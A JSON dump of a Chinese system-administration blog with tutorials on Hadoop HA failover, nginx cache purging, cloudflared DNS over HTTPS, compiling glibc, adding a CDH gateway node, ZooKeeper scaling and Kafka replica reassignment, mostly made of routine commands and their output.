&lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--有3种StateStore,分别是基于zookeeper,HDFS和leveldb--&gt;&lt;!--HA高可用集群必须用ZKRMStateStore--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.store.class&lt;&#x2F;name&gt; &lt;value&gt;org.apache.hadoop.yarn.server.resourcemanager.recovery.ZKRMStateStore&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--指定RM的cluster-id集群标识--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.cluster-id&lt;&#x2F;name&gt; &lt;value&gt;yarn-ha&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--指定两台RM主机名标识符,最少2个--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;&#x2F;name&gt; &lt;value&gt;rm1,rm2&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--RM主机1--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;&#x2F;name&gt; &lt;value&gt;ActiveNN&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--RM主机2--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;&#x2F;name&gt; &lt;value&gt;StandbyNN&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--RM故障自动转移--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.automatic-failover.recover.enabled&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--RM故障自动恢复--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.recovery.enabled&lt;&#x2F;name&gt; &lt;value&gt;true&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--指定ZK集群地址--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.zk-address&lt;&#x2F;name&gt; &lt;value&gt;Slave1:2181,Slave2:2181,Slave3:2181&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;!--RM HTTP访问地址，查看集群信息--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm1&lt;&#x2F;name&gt; &lt;value&gt;ActiveNN:8088&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm2&lt;&#x2F;name&gt; &lt;value&gt;StandbyNN:8088&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;&lt;&#x2F;configuration&gt; 将以上配置文件上传到3台slave 1将hadoop-env.sh、core-site.xml、hdfs-site.xml、mapred-site.xml和yarn-site.xml 这修改好的文件，上传到3台Slave节点 Hadoop集群初始化格式化ZKFC(在ActiveNN上执行)1首先需要启动zookeeper集群 12[root@activenn ~]# cd &#x2F;opt&#x2F;hadoop&#x2F;[root@activenn hadoop]# bin&#x2F;hdfs zkfc -formatZK 格式化成功信息 123419&#x2F;03&#x2F;15 18:56:11 INFO ha.ActiveStandbyElector: Session connected.19&#x2F;03&#x2F;15 18:56:11 INFO ha.ActiveStandbyElector: Successfully created &#x2F;hadoop-ha&#x2F;nn in ZK.19&#x2F;03&#x2F;15 18:56:11 INFO zookeeper.ZooKeeper: Session: 0x36980347ba60001 closed19&#x2F;03&#x2F;15 18:56:11 INFO zookeeper.ClientCnxn: EventThread shut down 格式化HDFS启动journalnode(分别在Slave1、Slave2和Slave3上执行) 1hadoop-daemon.sh start journalnode 启动验证 12345678[root@slave1 hadoop]# jps -m2532 JournalNode[root@slave2 hadoop]# jps -m2532 JournalNode[root@slave3 hadoop]# jps -m2532 JournalNode 格式化HDFS(在ActiveNN上执行) 1hdfs namenode -format 12345出现如下信息说明HDFS格式化成功19&#x2F;03&#x2F;15 19:11:35 INFO common.Storage: Storage directory &#x2F;data&#x2F;A&#x2F;namenode has been successfully formatted.19&#x2F;03&#x2F;15 19:11:36 INFO namenode.FSImageFormatProtobuf: Saving image file &#x2F;data&#x2F;A&#x2F;namenode&#x2F;current&#x2F;fsimage.ckpt_0000000000000000000 using no compression19&#x2F;03&#x2F;15 19:11:36 INFO namenode.FSImageFormatProtobuf: Image file &#x2F;data&#x2F;A&#x2F;namenode&#x2F;current&#x2F;fsimage.ckpt_0000000000000000000 of size 350 bytes saved in 0 seconds. 将格式化之后的ActiveNN节点hadoop工作目录中的元数据目录复制到StandbyNN节点 1scp -r &#x2F;data&#x2F;A&#x2F;namenode&#x2F;current StandbyNN:&#x2F;data&#x2F;A&#x2F;namenode 初始化完毕之后可以把3个slave节点的journalnode服务关闭（分别在Slave1、Slave2、Slave3上执行） 123456[root@slave3 hadoop]# hadoop-daemon.sh stop journalnodestopping journalnode[root@slave3 hadoop]# jps -m2657 Jps -m2150 QuorumPeerMain &#x2F;opt&#x2F;zookeeper&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg 启动Hadoop所涉及的服务(在ActiveNN上执行)1[root@activenn ~]# start-all.sh 启动各节点的jobhistoryserver1234567注：启动historyserver： &#x2F;opt&#x2F;hadoop&#x2F;sbin&#x2F;mr-jobhistory-daemon.sh start historyserver 停止historyserver： &#x2F;opt&#x2F;hadoop&#x2F;sbin&#x2F;mr-jobhistory-daemon.sh sop historyserver 当我们启动jobhistoryserver服务之后，在HDFS上&#x2F;tmp&#x2F;hadoop-yarn&#x2F;staging&#x2F;history路径下会生成两个文件夹：done和done_intermediate。done文件夹下存放已经完成的job，done_intermediate文件夹下存放正在进行的job信息。 Jobhistory serverWeb UI 1http:&#x2F;&#x2F;主机名:19888 启动各节点Yarn nodemanager服务hadoop start-all.sh命令除了自己的nodemanager服务之外，不会启动其他节点的nodemanager服务，故其他节点的nodemanager服务需要手动启动 1234[root@slave1 hadoop]# start-yarn.sh[root@slave2 hadoop]# start-yarn.sh[root@slave3 hadoop]# start-yarn.sh[root@standbynn hadoop]# start-yarn.sh HDFS HA Web 验证1http:&#x2F;&#x2F;ActiveNN:50070 1http:&#x2F;&#x2F;StandbyNN:50070 HDFS HA功能验证1测试是否为HA，可以先 kill 这个 active NN，然后另外一个 standby NN就会变成 active NN。 Kill掉NameNode进程 1[root@ActiveNN ~]# kill 10205 &#x2F;&#x2F;kill掉NameNode进程 123456789[root@standbynn ~]# jps -m9475 NameNode9578 DFSZKFailoverController9837 Jps -m[root@standbynn ~]# kill 9475[root@standbynn ~]# jps -m9863 Jps -m9578 DFSZKFailoverController 此时，Standbynn节点进程已经死掉了，下面通过访问ActiveNN节点，查看是否变为Active YARN-ResourceManager HA验证注意：在ActiveNN节点使用命令：start-all.sh或start-yarn.sh 启动YARN时，不会启动StandbyNN节点的YARN进程 手动启动StandbyNN节点YARN 1[root@standbynn hadoop]# yarn-daemon.sh start resourcemanager 1234[root@standbynn hadoop]# jps -m29201 DFSZKFailoverController29090 NameNode29353 ResourceManager YARN管理命令 1YARN管理命令用到的是yarn rmadmin ,作用：可以查看RM的健康状态、转换Active&#x2F;Standby状态等。 查看RM状态来验证HA 1234[root@activenn hadoop]# yarn rmadmin -getServiceState rm1active[root@activenn hadoop]# yarn rmadmin -getServiceState rm2standby Web方式访问RM来查看作业信息 12主：http:&#x2F;&#x2F;10.0.10.100:8088备：http:&#x2F;&#x2F;10.0.10.101:8088(当状态为active时才能被访问) 模拟10.0.10.100的RM进程挂掉，看看会不会故障自动转移 1root@activenn hadoop]# stop-yarn.sh 1234567[root@activenn hadoop]# yarn rmadmin -getServiceState rm1Operation failed: Call From activenn&#x2F;10.0.10.100 to ActiveNN:8033 failed on connection exception: java.net.ConnectException: Connection refused; For more details see: http:&#x2F;&#x2F;wiki.apache.org&#x2F;hadoop&#x2F;ConnectionRefused[root@activenn hadoop]# yarn rmadmin -getServiceState rm2active可以看到，HA已经自动切换了","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"HA","slug":"HA","permalink":"https://garywu520.github.io/tags/HA/"},{"name":"sqoop","slug":"sqoop","permalink":"https://garywu520.github.io/tags/sqoop/"},{"name":"yarn","slug":"yarn","permalink":"https://garywu520.github.io/tags/yarn/"},{"name":"hive","slug":"hive","permalink":"https://garywu520.github.io/tags/hive/"},{"name":"RM HA","slug":"RM-HA","permalink":"https://garywu520.github.io/tags/RM-HA/"},{"name":"hbase","slug":"hbase","permalink":"https://garywu520.github.io/tags/hbase/"}]},{"title":"nginx清理Proxy Cache缓存","slug":"nginx清理Proxy-Cache缓存","date":"2018-12-14T05:06:10.000Z","updated":"2018-12-14T05:27:41.976Z","comments":true,"path":"2018/12/14/nginx清理Proxy-Cache缓存/","link":"","permalink":"https://garywu520.github.io/2018/12/14/nginx%E6%B8%85%E7%90%86Proxy-Cache%E7%BC%93%E5%AD%98/","excerpt":"Nginx缓存nginx基于proxy_cache_purge模块可以配置Nginx缓存。在http区域中添加： 1234567proxy_cache_path &#x2F;data&#x2F;A&#x2F;proxy_cache levels&#x3D;2:2 keys_zone&#x3D;first:20m inactive&#x3D;1d max_size&#x3D;100m;levels 设置目录层次 keys_zone 设置缓存名字和共享内存大小 inactive 在指定时间内没人访问则被删除在这里是1天 max_size 最大缓存空间","text":"Nginx缓存nginx基于proxy_cache_purge模块可以配置Nginx缓存。在http区域中添加： 1234567proxy_cache_path &#x2F;data&#x2F;A&#x2F;proxy_cache levels&#x3D;2:2 keys_zone&#x3D;first:20m inactive&#x3D;1d max_size&#x3D;100m;levels 设置目录层次 keys_zone 设置缓存名字和共享内存大小 inactive 在指定时间内没人访问则被删除在这里是1天 max_size 最大缓存空间 在location定义： 1234567location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;music&#x2F;; #只代理的music部分 proxy_set_header Host x.x.xxx.com; proxy_cache_valid 200 304 100d; proxy_cache music; proxy_cache_key $uri;&#125; 12345参数解释： proxy_cache first; 根keys_zone后的内容对应 proxy_cache_valid 200 304 301 302 10d; 哪些状态缓存多长时间 proxy_cache_valid any 1d; 其他的缓存多长时间 proxy_cache_key $uri; 通过key来hash，定义KEY的值 缓存清理12前提：需要重新编译nginx.&#x2F;configure –add-module&#x3D;&#x2F;root&#x2F;ngx_cache_purge-2.3 然后进行如下配置 1234location ~ &#x2F;purge(&#x2F;.*) &#123; allow all; proxy_cache_purge music $1$is_args$args;&#125; 清理测试12345对页面进行访问：curl -H &quot;Host:x.b.xxx.com&quot; http:&#x2F;&#x2F;x.x.x.x:443&#x2F;a.png清理页面访问：curl -H &quot;Host:x.b.xxx.com&quot; http:&#x2F;&#x2F;x.x.x.x:443&#x2F;purge&#x2F;a.png注：区别是清理页面URL中含有purge二级目录","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"cache","slug":"cache","permalink":"https://garywu520.github.io/tags/cache/"},{"name":"proxy cache","slug":"proxy-cache","permalink":"https://garywu520.github.io/tags/proxy-cache/"},{"name":"Nginx缓存清理","slug":"Nginx缓存清理","permalink":"https://garywu520.github.io/tags/Nginx%E7%BC%93%E5%AD%98%E6%B8%85%E7%90%86/"}]},{"title":"Linux上学会使用DNS over HTTPS","slug":"Linux上学会使用DNS-over-HTTPS","date":"2018-12-13T08:31:26.000Z","updated":"2018-12-13T09:27:39.573Z","comments":true,"path":"2018/12/13/Linux上学会使用DNS-over-HTTPS/","link":"","permalink":"https://garywu520.github.io/2018/12/13/Linux%E4%B8%8A%E5%AD%A6%E4%BC%9A%E4%BD%BF%E7%94%A8DNS-over-HTTPS/","excerpt":"1适用场景：在国内有台linux服务器，解析不想被污染,可以采用此方法。 官网下载Cloudflared二进制程序下载链接 1234wget https:&#x2F;&#x2F;bin.equinox.io&#x2F;c&#x2F;VdrWdbjqyF&#x2F;cloudflared-stable-linux-amd64.tgztar -zxvf cloudflared-stable-linux-amd64.tgzmv cloudflared &#x2F;usr&#x2F;sbin&#x2F;cloudflared --version Glibc升级到2.171如果报glibc.so.6的相关错误，就需要升级glibc版本 无损升级glibc-参考","text":"1适用场景：在国内有台linux服务器，解析不想被污染,可以采用此方法。 官网下载Cloudflared二进制程序下载链接 1234wget https:&#x2F;&#x2F;bin.equinox.io&#x2F;c&#x2F;VdrWdbjqyF&#x2F;cloudflared-stable-linux-amd64.tgztar -zxvf cloudflared-stable-linux-amd64.tgzmv cloudflared &#x2F;usr&#x2F;sbin&#x2F;cloudflared --version Glibc升级到2.171如果报glibc.so.6的相关错误，就需要升级glibc版本 无损升级glibc-参考 设置本机DNS over HTTPS环境123456# cloudflared proxy-dnsINFO[0000] Adding DNS upstream url&#x3D;&quot;https:&#x2F;&#x2F;1.1.1.1&#x2F;dns-query&quot;INFO[0000] Adding DNS upstream url&#x3D;&quot;https:&#x2F;&#x2F;1.0.0.1&#x2F;dns-query&quot;INFO[0000] Starting metrics server addr&#x3D;&quot;127.0.0.1:49312&quot;INFO[0000] Starting DNS over HTTPS proxy server addr&#x3D;&quot;dns:&#x2F;&#x2F;localhost:53&quot; 验证DNS123新开一个窗口进行解析测试dig flickr.com @127.0.0.1 设置DNS over HTTPS环境为默认DNS环境12345678mkdir -p &#x2F;usr&#x2F;local&#x2F;etc&#x2F;cloudflaredcat &lt;&lt; EOF &gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;cloudflared&#x2F;config.yml proxy-dns: true proxy-dns-upstream: - https:&#x2F;&#x2F;1.1.1.1&#x2F;dns-query - https:&#x2F;&#x2F;1.0.0.1&#x2F;dns-queryEOF 将DNS over HTTPS安装为自启动服务1cloudflared service install 12报错：INFO[0000] Failed to copy user configuration. Before running the service, ensure that &#x2F;etc&#x2F;cloudflared contains two files, cert.pem and config.yml error&#x3D;&quot;open &#x2F;usr&#x2F;local&#x2F;etc&#x2F;cloudflared&#x2F;cert.pem: no such file or directory&quot; 12解决方法：cp &#x2F;etc&#x2F;cloudflared&#x2F;cert.pem &#x2F;usr&#x2F;local&#x2F;etc&#x2F;cloudflared&#x2F; 再次执行 123456#loudflared service installINFO[0000] Copied &#x2F;usr&#x2F;local&#x2F;etc&#x2F;cloudflared&#x2F;config.yml to &#x2F;etc&#x2F;cloudflared&#x2F;config.yml INFO[0000] Using Systemd INFO[0000] systemctl: Created symlink from &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;cloudflared.service to &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;cloudflared.service.INFO[0000] systemctl daemon-reload 服务检查及启动123systemctl enable cloudflaredsystemctl start cloudflaredsystemctl status cloudflared 最后修改/etc/resolv.conf1echo &quot;nameserver 127.0.0.1&quot; &gt;&gt;&#x2F;etc&#x2F;resolv.conf 测试123456789101112131415161718192021[root@cloudflared]# dig flickr.com; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-61.el7 &lt;&lt;&gt;&gt; flickr.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 31835;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;flickr.com. IN A;; ANSWER SECTION:flickr.com. 75 IN A 69.147.88.7flickr.com. 75 IN A 69.147.92.11;; Query time: 1 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Thu Dec 13 18:06:35 CST 2018;; MSG SIZE rcvd: 91","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"DNS over HTTPS","slug":"DNS-over-HTTPS","permalink":"https://garywu520.github.io/tags/DNS-over-HTTPS/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://garywu520.github.io/tags/cloudflare/"}]},{"title":"Glibc编译升级到2.17","slug":"Glibc编译升级到2-17","date":"2018-12-13T08:27:05.000Z","updated":"2018-12-13T08:28:34.656Z","comments":true,"path":"2018/12/13/Glibc编译升级到2-17/","link":"","permalink":"https://garywu520.github.io/2018/12/13/Glibc%E7%BC%96%E8%AF%91%E5%8D%87%E7%BA%A7%E5%88%B02-17/","excerpt":"查看目前glibc版本1234567891011121314151617[root@HY Desktop]# strings &#x2F;lib64&#x2F;libc.so.6 |grep GLIBC_GLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_PRIVATE","text":"查看目前glibc版本1234567891011121314151617[root@HY Desktop]# strings &#x2F;lib64&#x2F;libc.so.6 |grep GLIBC_GLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_PRIVATE 下载glibc-2.171wget http:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;glibc&#x2F;glibc-2.17.tar.gz 编译安装1234567tar –zxvf glibc-2.17.tar.gzcd glibc-2.17mkdir buildcd build..&#x2F;configure --prefix&#x3D;&#x2F;usr --disable-profile --enable-add-ons --with-headers&#x3D;&#x2F;usr&#x2F;include --with-binutils&#x3D;&#x2F;usr&#x2F;binmake –j4make install 重新查看现在glibc版本12345678910111213141516171819202122[root@HY build]# strings &#x2F;lib64&#x2F;libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_PRIVATE 1234567[root@HY build]# ldd --versionldd (GNU libc) 2.17Copyright (C) 2012 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.Written by Roland McGrath and Ulrich Drepper. 故障紧急修复12linux执行简单的命令都出现如下错误：&#x2F;usr&#x2F;bin&#x2F;python_xx:error while loading shared libraries: __vdso_time: invalid mode for dlopen(): Invalid argument 1我们在安装某些组件时，会升级系统的libc，然后libc通常是跟gcc版本对应的，如果没有预先的升级好gcc，都会出现升级失败的问题。当然，一旦升级失败，系统都会出现如上错误, 许多简单的linux命令都无法执行。 12345此时必须谨记：不能断开当前shell连接，以centos7系统为例，执行以下命令：LD_PRELOAD&#x3D;&#x2F;lib64&#x2F;libc-2.12.so ln -sf &#x2F;lib64&#x2F;libc-2.12.so &#x2F;lib64&#x2F;libc.so.6执行完以上命令，即可恢复正常状态","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"glibc","slug":"glibc","permalink":"https://garywu520.github.io/tags/glibc/"},{"name":"strings","slug":"strings","permalink":"https://garywu520.github.io/tags/strings/"},{"name":"glibc升级","slug":"glibc升级","permalink":"https://garywu520.github.io/tags/glibc%E5%8D%87%E7%BA%A7/"}]},{"title":"CDH集群的Gateway节点","slug":"CDH集群的Gateway节点","date":"2018-12-11T06:24:49.000Z","updated":"2018-12-11T07:53:40.724Z","comments":true,"path":"2018/12/11/CDH集群的Gateway节点/","link":"","permalink":"https://garywu520.github.io/2018/12/11/CDH%E9%9B%86%E7%BE%A4%E7%9A%84Gateway%E8%8A%82%E7%82%B9/","excerpt":"什么是Gateway节点？1Gateway节点又称为客户端节点，它是Hadoop集群的接口机。主要会部署一些客户端的配置、脚本命令等。如：HDFS的core-site.xml , hdfs-site.xml以及hadoop的操作命令 123如果你使用的是Apache Hadoop，你只需要将hadoop相关服务的配置和脚本命令拷贝到客户端机器即可，但一旦集群的配置有所修改，你需要注意也同步到客户端机器。如果是CDH集群，客户端节点也会是Cloudera Manager管理的一台机器，它会被安装cloudera-scm-agent服务，以及CDH的Parcel，部署客户端配置Cloudera Manager会统一做，另外如果客户端机器出现异常，Cloudera Manager也会告警。","text":"什么是Gateway节点？1Gateway节点又称为客户端节点，它是Hadoop集群的接口机。主要会部署一些客户端的配置、脚本命令等。如：HDFS的core-site.xml , hdfs-site.xml以及hadoop的操作命令 123如果你使用的是Apache Hadoop，你只需要将hadoop相关服务的配置和脚本命令拷贝到客户端机器即可，但一旦集群的配置有所修改，你需要注意也同步到客户端机器。如果是CDH集群，客户端节点也会是Cloudera Manager管理的一台机器，它会被安装cloudera-scm-agent服务，以及CDH的Parcel，部署客户端配置Cloudera Manager会统一做，另外如果客户端机器出现异常，Cloudera Manager也会告警。 CDH上如何增加一台Gateway节点？1234流程： 一、创建Gateway节点的主机模板 二、Gateway节点的前置准备 三、增加Gateway节点到集群并应用主机模板 一、创建Gateway节点的主机模板1. 创建Gateway节点的主机模板1从Cloudera Manager进入“主机模板”页面 ---&gt; 点击创建 2. 给模板命名，并选择各个服务的Gateway角色 3. 点击“创建” , 确认创建成功 二、Gateway节点的前置准备12345671.确保OS的yum源可以正常使用，通过yum repolist命令可以查看到匹配的OS的所有包2.确保Cloudera Manager的yum源运行正常3.hosts文件配置，需要将Gateway节点的IP和hostname加入到CDH集群节点的hosts文件中，并同步到所有机器包括Gateway节点4.禁用SELinux5.关闭防火墙6.配置时钟同步请务必确保以上操作都已完成，并成功配置，否则接下来的增加节点操作会失败！ 三、增加Gateway节点的集群并应用主机模板1. 进入“所有主机”页面 —&gt; 点击“向集群添加主机” —&gt; 选择“经典向导” —&gt; 点击“继续” 2. 输入Gateway节点的IP或者hostname，点击搜索，完成后点击“继续” 3. 选择“自定义存储库”, 并输入Cloudera Manager的yum源http地址，点击“继续” 4. 勾选Java的两个选项，点击“继续” 5. 输入Gateway节点的root密码，并点击“继续” 6. 等待cloudera-scm-agent在Gateway节点上安装 安装完成后点击“继续” 7. 等待分发Parcel包并激活，完成后，点击“继续” ​ 8. 主机检查，点击“继续”​ 9. 选择主机模板​ ​ 没有发现之前创建的主机模板文件，这里先不管了，回到Cloudera Manager主页。你也可以在这个页面点击“创建”，直接创建一个主机模板，选中后，点击继续。 10. 点击进入“所有主机”页面，可以发现新的Gateway节点已经在主机列表中 11. 选中Gateway节点，点击“已选定的操作”，并点击“应用主机模板”​ 12. 选择之前创建好的主机模板，并勾选应用主机模板，确认。​ 13. 等待应用主机模板命令执行完毕，待所有步骤执行完毕后，点击“关闭”​ 14. 确认所有Gateway角色已经部署到新的节点​ 至此，给CDH集群增加新的Gateway节点完成。 参考自：微信公众号Hadoop实操","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Gateway","slug":"Gateway","permalink":"https://garywu520.github.io/tags/Gateway/"},{"name":"cdh","slug":"cdh","permalink":"https://garywu520.github.io/tags/cdh/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"cloudera","slug":"cloudera","permalink":"https://garywu520.github.io/tags/cloudera/"},{"name":"cloudera Manager","slug":"cloudera-Manager","permalink":"https://garywu520.github.io/tags/cloudera-Manager/"}]},{"title":"zookeeper集群节点扩容与缩减","slug":"zookeeper集群节点扩容与缩减","date":"2018-12-11T04:15:37.000Z","updated":"2018-12-11T04:17:05.788Z","comments":true,"path":"2018/12/11/zookeeper集群节点扩容与缩减/","link":"","permalink":"https://garywu520.github.io/2018/12/11/zookeeper%E9%9B%86%E7%BE%A4%E8%8A%82%E7%82%B9%E6%89%A9%E5%AE%B9%E4%B8%8E%E7%BC%A9%E5%87%8F/","excerpt":"节点扩容(1)CDH Zookeeper集群新增节点123首页找到并进入要操作的zookeeper集群 ---&gt; 实例 ---&gt; 添加角色实例直接下一步完成即可，新zk节点会继承现有集群配置。","text":"节点扩容(1)CDH Zookeeper集群新增节点123首页找到并进入要操作的zookeeper集群 ---&gt; 实例 ---&gt; 添加角色实例直接下一步完成即可，新zk节点会继承现有集群配置。 (2)确认新增zk实例已经启动1首先要进入zookeeper环境下的bin目录 123456789101112131415161718[spark@R720-130 bin]$ echo mntr |nc 10.70.0.212 2181zk_version 3.4.5-cdh5.4.4--1, built on 07&#x2F;06&#x2F;2015 23:54 GMTzk_avg_latency 7zk_max_latency 548zk_min_latency 0zk_packets_received 209zk_packets_sent 272zk_num_alive_connections 1zk_outstanding_requests 0zk_server_state followerzk_znode_count 311zk_watch_count 0zk_ephemerals_count 6zk_approximate_data_size 23783zk_open_file_descriptor_count 37zk_max_file_descriptor_count 32768这里主要关注“zk_server_state follower”说明新增的zk实例，成为了follower节点。 (3)在leader节点上查看目前状态同步的follower数，确认新增节点已经成功加入集群123456789101112131415161718192021[spark@R720-130 bin]$ echo mntr |nc 10.70.0.133 2181zk_version 3.4.5-cdh5.4.4--1, built on 07&#x2F;06&#x2F;2015 23:54 GMTzk_avg_latency 0zk_max_latency 7658zk_min_latency 0zk_packets_received 21059919zk_packets_sent 21475954zk_num_alive_connections 4zk_outstanding_requests 0zk_server_state leaderzk_znode_count 311zk_watch_count 54zk_ephemerals_count 6zk_approximate_data_size 23783zk_open_file_descriptor_count 42zk_max_file_descriptor_count 32768zk_followers 3zk_synced_followers 3zk_pending_syncs 0主要关注“zk_synced_followers 3”，意思是现在已经将数据同步到了3个follower节点，其中就包括我们新增的节点10.70.0.212 (4)接下来，滚动更新原有集群的配置，并重启。123这里需要注意：- 在重启follwer节点的时候并无任何影响,所以首先要逐个重启follwer节点；- 不过在重启leader节点的时候，这个时候会触发一次新的leader选举【zxid最新的默认优先当选新的leader，当zxid相同，myid最大的优先当选新的leader】 (5)zookeeper leader重新选举后，如果不放心可以在命令行确认123456789101112131415161718192021[spark@R720-130 bin]$ echo mntr |nc 10.70.0.212 2181zk_version 3.4.5-cdh5.4.4--1, built on 07&#x2F;06&#x2F;2015 23:54 GMTzk_avg_latency 2zk_max_latency 101zk_min_latency 0zk_packets_received 115zk_packets_sent 124zk_num_alive_connections 2zk_outstanding_requests 0zk_server_state leaderzk_znode_count 311zk_watch_count 3zk_ephemerals_count 6zk_approximate_data_size 23783zk_open_file_descriptor_count 42zk_max_file_descriptor_count 32768zk_followers 3zk_synced_followers 3zk_pending_syncs 0这里主要关注“zk_server_state leader” 这一行即可。 关于CDH警告1当zookeeper集群服务器数量是偶数时，CDH 会出现验证警告，说zookeeper服务必须拥有奇数台服务器。这个警告忽略即可，因为这是从安全方面的考量。接下来我们就要将其中一个follower下线，故不影响服务的启动与工作 节点缩容1首先要确定要移除的zookeeper节点在集群中的状态不是Leader。 (1)直接将要下线的follower节点下线1CDH Web页面直接删除即可 (2)接下来要逐个重启zk follower节点1CDH Web页面挨个重启即可，等第一个zk follower节点状态正常后，再重启下一个 (3) 最后重启zk leader节点1注意：此时会重新触发一次leader选举，故需要与业务方确认。","categories":[],"tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"spark","slug":"spark","permalink":"https://garywu520.github.io/tags/spark/"},{"name":"zk","slug":"zk","permalink":"https://garywu520.github.io/tags/zk/"}]},{"title":"KAFKA动态增加Topic副本Replication","slug":"KAFKA动态增加Topic副本Replication","date":"2018-12-06T09:14:51.000Z","updated":"2018-12-06T09:16:15.553Z","comments":true,"path":"2018/12/06/KAFKA动态增加Topic副本Replication/","link":"","permalink":"https://garywu520.github.io/2018/12/06/KAFKA%E5%8A%A8%E6%80%81%E5%A2%9E%E5%8A%A0Topic%E5%89%AF%E6%9C%ACReplication/","excerpt":"查看当前的Topic信息123$ kafka-topics.sh --describe --zookeeper localhost:2181 --topic node_logTopic:node_log PartitionCount:1 ReplicationFactor:1 Configs: Topic: node_log Partition: 0 Leader: 2 Replicas: 2 Isr: 2","text":"查看当前的Topic信息123$ kafka-topics.sh --describe --zookeeper localhost:2181 --topic node_logTopic:node_log PartitionCount:1 ReplicationFactor:1 Configs: Topic: node_log Partition: 0 Leader: 2 Replicas: 2 Isr: 2 手动创建文件：add_replication.json1234567891011121314&#123; &quot;version&quot;:1 &quot;partitions&quot;:[ &#123; &quot;topic&quot;:&quot;node_log&quot;, &quot;partition&quot;:0, &quot;replicas&quot;:[ 0, 1, 2 ] &#125; ]&#125; 重新分配partition（其实这里是添加副本replication）1234567$ kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file 